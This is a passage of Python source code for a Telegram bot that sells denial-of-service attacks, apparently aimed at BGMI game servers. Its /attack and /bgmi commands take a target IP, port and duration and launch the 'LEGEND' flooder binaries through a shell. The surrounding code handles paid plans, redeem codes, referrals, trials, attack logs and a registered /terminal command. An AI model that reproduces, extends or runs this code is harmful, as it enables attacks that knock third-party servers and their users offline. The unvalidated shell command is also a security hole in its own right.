        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Maximum attack time set to {max_time} seconds.", parse_mode='Markdown')
    except ValueError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Error: {e}", parse_mode='Markdown')

# Log attack
async def log_attack(user_id, ip, port, duration):
    attack_log = {
        "user_id": user_id,
        "ip": ip,
        "port": port,
        "duration": duration,
        "timestamp": datetime.now(timezone.utc)
    }
    attack_logs_collection.insert_one(attack_log)

# Attack command
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    current_time = datetime.now(timezone.utc)
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ You are not authorized to use this bot!", parse_mode='Markdown')
        return
    last_attack_time = cooldown_dict.get(user_id)
    if last_attack_time:
        elapsed_time = current_time - last_attack_time
        if elapsed_time < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(chat_id=chat_id, text=f"⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /attack again.", parse_mode='Markdown')
            return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: /attack <ip> <port> <duration>", parse_mode='Markdown')
        return
    ip, port, duration = args
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid IP prefix. Only specific IP ranges are allowed.", parse_mode='Markdown')
        return
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="❌ You have already attacked this IP and port", parse_mode='Markdown')
        return
    try:
        duration = int(duration)
        max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
        max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME
        if duration > max_attack_time:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Duration must be an integer representing seconds.", parse_mode='Markdown')
        return
    argument_type = settings_collection.find_one({"setting": "argument_type"})
    argument_type = argument_type["value"] if argument_type else 3
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})
    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS
    if argument_type == 3:
        attack_command = f"./LEGEND3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./LEGEND4 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./LEGEND {ip} {port} {duration} {byte_size} {threads}"
    await context.bot.send_message(chat_id=chat_id, text=(
        f"⚔️ Attack Launched! ⚔️\n"
        f"🎯 Target: {ip}:{port}\n"
        f"⏱️ Duration: {duration} seconds\n"
        f"🔥 Let the battlefield ignite! 💥"
    ), parse_mode='Markdown')
    await log_attack(user_id, ip, port, duration)
    asyncio.create_task(run_attack(chat_id, attack_command, context))
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))

# BGMI attack command
async def bgmi(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    current_time = datetime.now(timezone.utc)
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="❌ You are not authorized to use this bot!", parse_mode='Markdown')
        return
    last_attack_time = cooldown_dict.get(user_id)
    if last_attack_time:
        elapsed_time = current_time - last_attack_time
        if elapsed_time < COOLDOWN_PERIOD:
            remaining_time = COOLDOWN_PERIOD - elapsed_time
            await context.bot.send_message(chat_id=chat_id, text=f"⏳ Please wait {remaining_time.seconds // 60} minute(s) and {remaining_time.seconds % 60} second(s) before using /bgmi again.", parse_mode='Markdown')
            return
    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: /bgmi <ip> <port> <duration>", parse_mode='Markdown')
        return
    ip, port, duration = args
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Invalid IP prefix. Only specific IP ranges are allowed.", parse_mode='Markdown')
        return
    if user_id in user_attack_history and (ip, port) in user_attack_history[user_id]:
        await context.bot.send_message(chat_id=chat_id, text="❌ You have already attacked this IP and port", parse_mode='Markdown')
        return
    try:
        duration = int(duration)
        max_attack_time_setting = settings_collection.find_one({"setting": "max_attack_time"})
        max_attack_time = max_attack_time_setting["value"] if max_attack_time_setting else DEFAULT_MAX_ATTACK_TIME
        if duration > max_attack_time:
            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Maximum attack duration is {max_attack_time} seconds. Please reduce the duration.", parse_mode='Markdown')
            return
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Duration must be an integer representing seconds.", parse_mode='Markdown')
        return
    argument_type = settings_collection.find_one({"setting": "argument_type"})
    argument_type = argument_type["value"] if argument_type else 3
    byte_size = settings_collection.find_one({"setting": "byte_size"})
    threads = settings_collection.find_one({"setting": "threads"})
    byte_size = byte_size["value"] if byte_size else DEFAULT_BYTE_SIZE
    threads = threads["value"] if threads else DEFAULT_THREADS
    if argument_type == 3:
        attack_command = f"./LEGEND3 {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./LEGEND4 {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./LEGEND {ip} {port} {duration} {byte_size} {threads}"
    await context.bot.send_message(chat_id=chat_id, text=(
        f"⚔️ BGMI Attack Launched! ⚔️\n"
        f"🎯 Target: {ip}:{port}\n"
        f"⏱️ Duration: {duration} seconds\n"
        f"🔥 Let the battlefield ignite! 💥"
    ), parse_mode='Markdown')
    await log_attack(user_id, ip, port, duration)
    asyncio.create_task(run_attack(chat_id, attack_command, context))
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((ip, port))

# View attack log
async def view_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to view attack logs!", parse_mode='Markdown')
        return
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /log <user_id>", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    attack_logs = attack_logs_collection.find({"user_id": target_user_id})
    if attack_logs_collection.count_documents({"user_id": target_user_id}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ No attack history found for this user.", parse_mode='Markdown')
        return
    logs_text = "User Attack History:\n"
    for log in attack_logs:
        local_timestamp = log['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
        formatted_time = local_timestamp.strftime('%Y-%m-%d %I:%M %p')
        logs_text += (
            f"IP: {log['ip']}\n"
            f"Port: {log['port']}\n"
            f"Duration: {log['duration']} sec\n"
            f"Time: {formatted_time}\n\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=logs_text, parse_mode='Markdown')

# Delete attack log
async def delete_attack_log(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to delete attack logs!", parse_mode='Markdown')
        return
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /delete_log <user_id>", parse_mode='Markdown')
        return
    target_user_id = int(context.args[0])
    result = attack_logs_collection.delete_many({"user_id": target_user_id})
    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Deleted {result.deleted_count} attack log(s) for user {target_user_id}.", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ No attack history found for this user to delete.", parse_mode='Markdown')

# Run attack
async def run_attack(chat_id, attack_command, context):
    try:
        process = await asyncio.create_subprocess_shell(attack_command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    finally:
        await context.bot.send_message(chat_id=chat_id, text="✅ Attack Completed! ✅\nThank you for using our service!", parse_mode='Markdown')

# Generate redeem code
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to generate redeem codes!", parse_mode='Markdown')
        return
    if len(context.args) < 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]", parse_mode='Markdown')
        return
    max_uses = 10
    custom_code = None
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Please specify time in days (d) or minutes (m).", parse_mode='Markdown')
        return
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ Please provide a valid number for max uses.", parse_mode='Markdown')
            return
    redeem_codes_collection.insert_one({"code": redeem_code, "expiry_date": expiry_date, "used_by": [], "max_uses": max_uses, "redeem_count": 0})
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# Redeem code
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Usage: /redeem <code>", parse_mode='Markdown')
        return
    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})
    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="❌ Invalid redeem code.", parse_mode='Markdown')
        return
    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="❌ This redeem code has expired.", parse_mode='Markdown')
        return
    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="❌ This redeem code has already reached its maximum number of uses.", parse_mode='Markdown')
        return
    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="❌ You have already redeemed this code.", parse_mode='Markdown')
        return
    users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
    redeem_codes_collection.update_one({"code": code}, {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}})
    await context.bot.send_message(chat_id=chat_id, text="✅ Redeem code successfully applied!\nYou can now use the bot.", parse_mode='Markdown')

# Delete redeem code
async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to delete redeem codes!", parse_mode='Markdown')
        return
    if len(context.args) > 0:
        specific_code = context.args[0]
        result = redeem_codes_collection.delete_one({"code": specific_code})
        if result.deleted_count > 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Redeem code `{specific_code}` has been deleted successfully.", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ Code `{specific_code}` not found.", parse_mode='Markdown')
    else:
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})
        if result.deleted_count > 0:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Deleted {result.deleted_count} expired redeem code(s).", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ No expired codes found to delete.", parse_mode='Markdown')

# List redeem codes
async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to view redeem codes!", parse_mode='Markdown')
        return
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ No redeem codes found.", parse_mode='Markdown')
        return
    codes = redeem_codes_collection.find()
    message = "🎟️ Active Redeem Codes:\n"
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60
        remaining_minutes = max(1, remaining_minutes)
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)"
        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# Cleanup expired users
async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ You are not authorized to perform this action!", parse_mode='Markdown')
        return
    current_time = datetime.now(timezone.utc)
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})
    expired_users_list = list(expired_users)
    if len(expired_users_list) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="⚠️ No expired users found.", parse_mode='Markdown')
        return
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Cleanup Complete!\nRemoved {len(expired_users_list)} expired users.", parse_mode='Markdown')

# Button handler
async def button(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    if query.data == 'attack':
        await query.message.reply_text("⚠️ Usage: /attack <ip> <port> <duration>", parse_mode='Markdown')
    elif query.data == 'bgmi':
        await query.message.reply_text("⚠️ Usage: /bgmi <ip> <port> <duration>", parse_mode='Markdown')
    elif query.data == 'pay_now':
        keyboard = []
        for plan, amount in PLANS.items():
            keyboard.append([InlineKeyboardButton(f"{plan} - {amount}₹", callback_data=f"plan_{plan}")])
        keyboard.append([InlineKeyboardButton("Trial Plan", callback_data='trial_plan')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text("💸 Select a Plan:", parse_mode='Markdown', reply_markup=reply_markup)
    elif query.data == 'check_balance':
        user_data = users_collection.find_one({"user_id": user_id})
        username = query.from_user.username or query.from_user.first_name or "User"
        if user_data and "expiry_date" in user_data:
            expiry = user_data["expiry_date"]
            if expiry.tzinfo is None:
                expiry = expiry.replace(tzinfo=timezone.utc)
            now = datetime.now(timezone.utc)
            remaining = expiry - now
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                status = "🟢 Approved"
            else:
                days = hours = minutes = 0
                status = "🔴 Expired"
            expiry_str = expiry.strftime('%Y-%m-%d %H:%M')
            msg = (
                f"👤 <b>Username:</b> @{username}\n"
                f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🔍 <b>Status:</b> {status}\n"
                f"📅 <b>Expires At:</b> {expiry_str}\n"
                f"⏳ <b>Time Left:</b> {days}d {hours}h {minutes}m"
            )
        else:
            msg = (
                f"👤 <b>Username:</b> @{username}\n"
                f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
                f"🔍 <b>Status:</b> ⚠️ Not Approved\n"
                f"💡 Use /redeem to activate your plan."
            )
        await query.message.reply_text(msg, parse_mode='HTML')
    elif query.data == 'refer_earn':
        referral_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        referrals_collection.update_one({"user_id": user_id}, {"$set": {"referral_code": referral_code, "referrals": 0, "points": 0}}, upsert=True)
        user_data = referrals_collection.find_one({"user_id": user_id})
        referral_link = f"https://t.me/NeoModEngine_Ddos_bot?start={user_data['referral_code']}"
        keyboard = [[InlineKeyboardButton("Share with your friends", url=f"https://t.me/share/url?url={referral_link}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = (
            f"📣 Refer & Earn:\n\n"
            f"Your Referral Link: {referral_link}\n"
            f"Referrals: {user_data['referrals']}\n"
            f"Points: {user_data['points']} (10 points per referral)\n\n"
            "How it works:\n"
            "- Share your link with friends.\n"
            "- When they join @NeoModEngineDdosbot and start the bot, you earn 10 points.\n"
            "- Use 5 points to launch an attack with /attack."
        )
        await query.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
    elif query.data == 'leaderboard':
        top_users = referrals_collection.find().sort("referrals", -1).limit(10)
        msg = "🏆 Leaderboard (Top 10 Referrers):\n\n"
        for i, user in enumerate(top_users, 1):
            username = (await context.bot.get_chat(user['user_id'])).username or "User"
            msg += f"{i}. 👤 @{username} (ID: {user['user_id']})\n   Referrals: {user['referrals']}, Points: {user['points']}\n"
        await query.message.reply_text(msg, parse_mode='Markdown')
    elif query.data == 'trial':
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get("trial_used", False):
            await query.message.reply_text("❌ You have already used your free trial!", parse_mode='Markdown')
            return
        keyboard = [[InlineKeyboardButton("ACTIVATE FREE TRIAL", callback_data='activate_trial')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text("🎁 180 Minutes Free Trial Available!", parse_mode='Markdown', reply_markup=reply_markup)
    elif query.data == 'activate_trial':
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get("trial_used", False):
            await query.message.reply_text("❌ You have already used your free trial!", parse_mode='Markdown')
            return
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=180)
        users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry_date, "trial_used": True}}, upsert=True)
        await query.message.reply_text("✅ Free Trial Activated!\nYou now have 180 minutes of bot access!", parse_mode='Markdown')
    elif query.data == 'txn_history':
        txns = txn_history_collection.find({"user_id": user_id}).sort("timestamp", -1)
        if txn_history_collection.count_documents({"user_id": user_id}) == 0:
            await query.message.reply_text("⚠️ No transaction history found.", parse_mode='Markdown')
            return
        msg = "📜 Transaction History:\n\n"
        for txn in txns:
            local_timestamp = txn['timestamp'].replace(tzinfo=timezone.utc).astimezone(LOCAL_TIMEZONE)
            formatted_time = local_timestamp.strftime('%Y-%m-%d %I:%M %p')
            msg += f"Order ID: {txn['order_id']}\nAmount: {txn['amount']}₹\nPlan: {txn['plan']}\nTime: {formatted_time}\n\n"
        await query.message.reply_text(msg, parse_mode='Markdown')
    elif query.data.startswith('plan_'):
        plan = query.data.replace('plan_', '')
        amount = PLANS.get(plan, 0)
        order_id = str(uuid.uuid4())
        expiry_date = datetime.now(timezone.utc) + timedelta(days=int(plan.split()[0]))
        msg = (
            f"PAYMENT DETAILS\n\n"
            f"Amount: {amount}₹ for {plan} access.\n"
            f"Order ID: {order_id}\n"
            f"Scan the QR Code Above\n"
            f"Your payment will be verified automatically!\n\n"
            "⚠️ This QR code will expire in 5 minutes."
        )
        # Placeholder for QR code (replace with actual payment gateway API call)
        # Example: You can integrate with Razorpay, Paytm, or UPI-based API
        # For Razorpay, you would create an order here and get a QR code URL
        # Add your payment gateway API integration here:
        # 1. Create an order with the payment gateway
        # 2. Get the QR code URL or payment link
        # 3. Send the QR code or link to the user
        # Example (pseudo-code for Razorpay):
        # import razorpay
        # client = razorpay.Client(auth=("YOUR_KEY", "YOUR_SECRET"))
        # order = client.order.create({'amount': amount  100, 'currency': 'INR', 'notes': {'user_id': user_id, 'plan': plan}})
        # qr_code_url = "YOUR_PAYMENT_GATEWAY_QR_CODE_URL"  # Replace with actual QR code URL from API
        await query.message.reply_text(msg, parse_mode='Markdown')
        # Store transaction temporarily for verification
        txn_history_collection.insert_one({
            "user_id": user_id,
            "order_id": order_id,
            "amount": amount,
            "plan": plan,
            "timestamp": datetime.now(timezone.utc),
            "status": "pending"
        })
        # Schedule QR code message deletion and payment verification
        asyncio.create_task(verify_payment(user_id, order_id, amount, plan, expiry_date, context, chat_id))

# Payment verification (placeholder)
async def verify_payment(user_id, order_id, amount, plan, expiry_date, context, chat_id):
    await asyncio.sleep(300)  # Wait 5 minutes
    # Add your payment gateway API verification here
    # Example (pseudo-code for Razorpay):
    # import razorpay
    # client = razorpay.Client(auth=("YOUR_KEY", "YOUR_SECRET"))
    # payment = client.order.payments(order_id)
    # if payment['status'] == 'captured':
    #     actual_amount = payment['amount'] / 100  # Convert paise to rupees
    #     days = int(actual_amount / 120)  # Adjust based on your pricing logic
    #     expiry_date = datetime.now(timezone.utc) + timedelta(days=days)
    #     users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
    #     txn_history_collection.update_one({"order_id": order_id}, {"$set": {"status": "success"}})
    #     await context.bot.send_message(chat_id=chat_id, text=f"✅ Payment Verified!\nYou now have access for {days} day(s)!", parse_mode='Markdown')
    # else:
    #     txn_history_collection.update_one({"order_id": order_id}, {"$set": {"status": "failed"}})
    #     await context.bot.send_message(chat_id=chat_id, text="❌ Payment verification failed.", parse_mode='Markdown')
    # For now, simulate success for the exact amount
    days = int(plan.split()[0])
    users_collection.update_one({"user_id": user_id}, {"$set": {"expiry_date": expiry_date}}, upsert=True)
    txn_history_collection.update_one({"order_id": order_id}, {"$set": {"status": "success"}})
    await context.bot.send_message(chat_id=chat_id, text=f"✅ Payment Simulated!\nYou now have access for {days} day(s)!", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("thread", set_thread))
    application.add_handler(CommandHandler("byte", set_byte))
    application.add_handler(CommandHandler("show", show_settings))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(MessageHandler(filters.PHOTO, feedback))
    application.add_handler(CommandHandler("user_info", user_info))
    application.add_handler(CommandHandler("broadcast", broadcast_message))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("dailyreward", dailyreward))
    application.add_handler(CommandHandler("spin", spin))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("argumentampe", set_argument))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("set_time", set_max_attack_time))
    application.add_handler(CommandHandler("log", view_attack_log))
    application.add_handler(CommandHandler("delete_log", delete_attack_log))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("ls", list_files))
    application.add_handler(CommandHandler("delete", delete_file))
    application.add_handler(CommandHandler("terminal", execute_terminal))
    application.add_handler(CallbackQueryHandler(button))
    application.run_polling()

if __name__ == '__main__':
    main()